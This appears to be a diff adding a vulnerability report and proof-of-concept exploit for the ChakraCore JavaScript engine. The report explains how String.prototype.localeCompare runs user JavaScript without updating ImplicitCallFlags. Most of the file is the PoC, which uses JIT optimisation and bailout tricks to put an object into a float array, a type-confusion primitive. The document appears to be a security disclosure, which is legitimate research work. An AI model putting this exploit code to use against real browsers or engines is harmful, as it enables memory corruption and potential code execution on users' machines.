@@ -1,0 +1,84 @@
+/*
+A call to the String.prototype.localeCompare method can be inlineed when it only takes one argument. There are two versions of String.prototype.localeCompare, one [1] is written in JavaScript and the other [2] is written in C++ which just calls the JavaScript version when Intl enabled without updating ImplicitCallFlags. Since JavaScript code could be executed without touching ImplicitCallFlags, this could be exploited in a similar way to that I used for  issue 1565 .
+
+The only usable code I could find in the JavaScript localeCompare was:
+            const thatStr = String(that);
+
+I could override the toString method of "that" which is the first parameter to execute arbitrary JavaScript code. But there was a problem that the toString method was also called in the C++ localeCompare prior to executing the JavaScript localeCompare which updated ImplicitCallFlags. Actually calling a JavaScript function can clear the flag during the initialization process [3] if profiling is enabled, but it was not for Intl.js. So I needed to find another way to exploit this.
+
+Here's the JavaScript localeCompare.
+
+let localeCompareStateCache;
+platform.registerBuiltInFunction(tagPublicFunction("String.prototype.localeCompare", function (that, locales = undefined, options = undefined) {
+    if (this === undefined || this === null) {
+        platform.raiseThis_NullOrUndefined("String.prototype.localeCompare");
+    }
+
+    const thisStr = String(this);
+    const thatStr = String(that);
+
+    // Performance optimization to cache the state object and UCollator when the default arguments are provided
+    // TODO(jahorto): investigate caching when locales and/or options are provided
+    let stateObject;
+    if (locales === undefined && options === undefined) {
+        if (localeCompareStateCache === undefined) {
+            localeCompareStateCache = _.create();
+            InitializeCollator(localeCompareStateCache, undefined, undefined);
+        }
+
+        stateObject = localeCompareStateCache;
+    } else {
+        stateObject = _.create();
+        InitializeCollator(stateObject, locales, options);
+    }
+
+    return platform.localeCompare(thisStr, thatStr, stateObject, /* forStringPrototypeLocaleCompare  true);
+}), IntlBuiltInFunctionID.StringLocaleCompare);
+
+My idea was to optimize the method partially, so that when it hits an unprofiled instruction, the flag gets cleared during the bailout process [4].
+
+[1] https://github.com/Microsoft/ChakraCore/blob/40f36e301848f105291bc669f6bb13016585b0c0/lib/Runtime/Library/InJavascript/Intl.js#L984
+[2] https://github.com/Microsoft/ChakraCore/blob/40f36e301848f105291bc669f6bb13016585b0c0/lib/Runtime/Library/JavascriptString.cpp#L1297
+[3] https://github.com/Microsoft/ChakraCore/blob/40f36e301848f105291bc669f6bb13016585b0c0/lib/Runtime/Language/InterpreterStackFrame.cpp#L1831
+[4] https://github.com/Microsoft/ChakraCore/blob/40f36e301848f105291bc669f6bb13016585b0c0/lib/Backend/BailOut.cpp#L1492
+
+
+PoC:
+*/
+
+function opt(arr, s) {
+    arr[0] = 1.1;
+
+    if (s !== null) {
+        let tmp = 'a'.localeCompare(s);
+    }
+
+    arr[0] = 2.3023e-320;
+}
+
+function main() {
+    let arr = [1.1];
+
+    for (let i = 0; i < 100; i++) {
+        'a'.localeCompare('x', []);  // Optimize the JavaScript localeCompare
+
+        opt(arr, null);  // for profiling all instructions in opt.
+
+        try {
+            opt(arr, {toString: () => {
+                throw 1;  // Don't profile "if (locales === undefined && options === undefined) {"
+            }});
+        } catch (e) {
+
+        }
+    }
+
+    opt(arr, {toString: () => {
+        // Called twice
+        arr[0] = {};
+    }});
+
+    print(arr);
+}
+
+main();
